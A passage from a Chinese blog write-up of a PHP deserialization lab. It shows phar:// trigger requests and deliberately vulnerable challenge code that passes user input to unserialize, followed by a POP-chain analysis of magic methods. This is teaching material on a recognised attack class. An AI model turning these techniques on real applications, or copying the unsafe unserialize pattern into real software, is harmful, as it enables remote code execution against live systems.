<div class="code-container" code-lang="Text"><div class="codebox"><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /target.php?action=upload&amp;data=[base64编码的phar文件内容]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>会返回类似：<code>Your file path:./upload/1234.txt</code>路径展示</p>
<p><code>./</code>：当前目录</p>
<p>发送请求：</p>
<div class="code-container" code-lang="Text"><div class="codebox"><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /un7.php?action=check&amp;file=phar://./upload/1234.txt</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>此时 <code>file_exists()</code> 会解析 phar 文件，反序列化 metadata 中的 <code>funny</code> 对象，触发 <code>__destruct()</code> 方法输出 flag。</p>
<h3 id="un-8"><a href="#un-8" class="headerlink" title="un-8"></a>un-8</h3><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./flag8.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">resolve</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function(<span class="variable">$fn</span>, <span class="variable">$prev</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fn</span>[<span class="number">0</span>] === <span class="string">&quot;system&quot;</span> &amp;&amp; <span class="variable">$prev</span> === <span class="string">&quot;ls&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Wow, you rce me! But I can&#x27;t let you do this. There is the flag. Enjoy it:)\n&quot;</span>;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @<span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>-&gt;<span class="keyword">string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Add Failed. Filename:&quot;</span>.<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span> = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;tryhackme&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>还有数组</p>
<p><code>__call($method, $args)</code>：调用不存在的方法时触发，在对象中调用一个不可访问方法时，<code>__call() </code>会被调用。</p>
<p><code>__toString()</code>:对象转字符串时调用，方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。</p>
<p>读取不可访问（protected 或 private）或不存在的属性的值时，<code>__get() </code>会被调用。filename和string</p>
<p><code>array_walk</code> — 使用用户自定义函数对数组中的每个元素做回调处理</p>
<p>有三个类，其中有很多个魔术方法，找触发开始和结束的链子，结束在函数resolve，返回flag，这个和popself那个题一样，这次打算换向理一理</p>
<ol>
<li>首先是看到flag的位置，想要得到flag需要满足等式，在payload中需要自定义一个函数使等式满足需要触发<code>resolve()</code>函数，</li>
<li>函数内两个变量的赋值倒是比较直接，只需要满足值相等就可以了，那这个函数是必须要存在的，不能作为<code>__call()</code>的触发点</li>
<li>但是这里刚好看到<code>__call()</code>这里，有陌生的函数，感觉是自定义函数的表示，所以应该是有两个自定义函数，然后一个是不存在的，另一个是需要做赋值使满足比较的</li>
<li>比较里是一个变量和一个数组，要求数组的第一个是system，也就是说其实可以在这个数组里放入一些其他东西</li>
<li>函数用add()，类c里有数组，还需要有一个无效函数触发，对，那就是add无效，但是<code>addme</code>有效，所以无效函数就是add()</li>
</ol>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">resolve</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function(<span class="variable">$fn</span>, <span class="variable">$prev</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fn</span>[<span class="number">0</span>] === <span class="string">&quot;system&quot;</span> &amp;&amp; <span class="variable">$prev</span> === <span class="string">&quot;ls&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Wow, you rce me! But I can&#x27;t let you do this. There is the flag. Enjoy it:)\n&quot;</span>;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @<span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>-&gt;<span class="keyword">string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<ul>
<li><strong>属性</strong>：<ul>
<li><code>public $object</code>：公开属性，可存储任意值。</li>
</ul>
</li>
<li><strong>方法</strong>：<ul>
<li><code>resolve()</code>：使用 <code>array_walk</code> 遍历当前对象（<code>$this</code>）。回调函数检查每个属性的键（<code>$prev</code>）是否为 <code>&quot;ls&quot;</code>，且值（<code>$fn</code>）的第一个元素是否为 <code>&quot;system&quot;</code>。条件满足时，通过 <code>global $flag</code> 引入全局变量 <code>$flag</code> 并输出。</li>
<li><code>__destruct()</code>：析构函数，在对象销毁时自动调用。尝试调用 <code>$this-&gt;object</code> 的 <code>add()</code> 方法，使用 <code>@</code> 抑制错误。</li>
<li><code>__toString()</code>：当对象被作为字符串使用时自动调用，返回 <code>$this-&gt;object-&gt;string</code> 的值。</li>
</ul>
</li>
</ul>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Add Failed. Filename:&quot;</span>.<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<ul>
<li><strong>属性</strong>：<ul>
<li><code>protected $filename</code>：受保护属性，仅在类内部或子类中可访问。</li>
</ul>
</li>
<li><strong>方法</strong>：<ul>
<li><code>addMe()</code>：受保护方法，返回包含 <code>$filename</code> 的字符串。</li>
<li><code>__call($func, $args)</code>：当调用不可访问的方法（如受保护或不存在的方法）时触发。使用 <code>call_user_func</code> 调用方法名加上 <code>&quot;Me&quot;</code> 后缀的方法（例如调用 <code>add</code> 则实际调用 <code>addMe</code>），并将 <code>$args</code> 作为参数传递。</li>
</ul>
</li>
</ul>
<p>这里能看出来需要利用的函数可以是add()</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span> = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<ul>
<li><strong>属性</strong>：<ul>
<li><code>private $string</code>：私有属性，仅在类内部可访问。</li>
</ul>
</li>
<li><strong>方法</strong>：<ul>
<li><code>__construct($string)</code>：构造函数，初始化 <code>$string</code> 属性。</li>
<li><code>__get($name)</code>：当访问不可访问的属性（如私有属性）时触发。将 <code>$this-&gt;$name</code> 赋值给 <code>$var</code>，然后尝试将 <code>$var</code> 作为数组，并调用 <code>$var[$name]()</code>。</li>
</ul>
</li>
</ul>
<p>这里，数组也出现了</p>
<p>如果要触发就有现成的可以直接用string</p>
<ul>
<li><code>array_walk($array, $callback)</code>：遍历数组或对象，对每个元素应用回调函数。回调函数接收值（<code>$fn</code>）和键（<code>$prev</code>）作为参数。</li>
<li><code>call_user_func($callback, $parameters)</code>：调用回调函数，第一个参数为可调用的回调，第二个为参数数组。</li>
<li><code>unserialize($data)</code>：将序列化的字符串转换回PHP值（可能包含对象实例）。</li>
<li><code>highlight_file($filename)</code>：输出文件内容，并高亮显示PHP语法。</li>
<li><code>global $var</code>：在函数内部引入全局作用域的变量 <code>$var</code>。</li>
<li><code>@</code> 错误控制运算符：抑制表达式可能产生的错误信息。</li>
</ul>
</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 LwhalE 于 2026-02-06 17:45:41 发布</div><div class="post-copyright-link"><span>作品地址：<a href="https://lwhaleee.github.io/2026/02/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/">php反序列化靶场</a></span><button class="copy-text" type="button" data-text="https://lwhaleee.github.io/2026/02/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>LwhalE's blog</a></div><img class="post-copyright-icon noview" src="/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"><a class="post-tail-tags-link" href="/tags/web/" rel="tag">web</a></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-list-text">PHP魔术方法</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A4%BA%E4%BE%8B"><span class="toc-list-text">序列化反序列化示例</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%AE%9E%E4%BE%8B%E5%AD%A6%E4%B9%A0%EF%BC%9A"><span class="toc-list-text">实例学习：</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2025geek-popself"><span class="toc-list-text">2025geek popself</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA"><span class="toc-list-text">PHP反序列化靶场</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#un-1"><span class="toc-list-text">un-1</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#un-2"><span class="toc-list-text">un-2</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#un-3"><span class="toc-list-text">un-3</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#un-4"><span class="toc-list-text">un-4</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#un-5"><span class="toc-list-text">un-5</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#un-6"><span class="toc-list-text">un-6</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#un-7"><span class="toc-list-text">un-7</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#un-8"><span class="toc-list-text">un-8</span></a></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="https://lwhaleee.github.io/2026/02/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div></main><footer><div class="footer"><div id="footer-copyright">© 2026 <span>💗</span> <a href="/null">LwhalE</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2026-01-10T22:00:00.000Z">🌻已稳定运行.年.月.天</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
  root: '/',
  toolbar: true,
  lazyload_src: '/assets/images/Meow-Loading.webp',
  friends: false,
  codeblock: true,
  share_text: '🐱Share From Meow',
  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
  mouse_click: false,
  notify:{
    enable: false,
    info: '复制成功～转载请标注本文地址',
    f12_info: '开发者模式已打开，请遵循本站版权协议'
  },
  search: {
    enable: false,
    path: '',
    local: {
      top_n_per_article: 1,
      preload: false
    }
  },
  encrypt: false,
};
</script><script>if (!localStorage.getItem('color-mode')) {
  localStorage.setItem('color-mode', 'light' || 'light');
}
document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
</script>
<script src="/js/theme/tools/utils.js"></script>

<script src="/js/plugins/dist/lazyload.min.js"></script>

<script src="/js/plugins/view-image.min.js"></script>
<script>if (localStorage.getItem('font-size')) {
  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
}
</script>
<script src="/js/main.js" type="module"></script>
</div></body></html>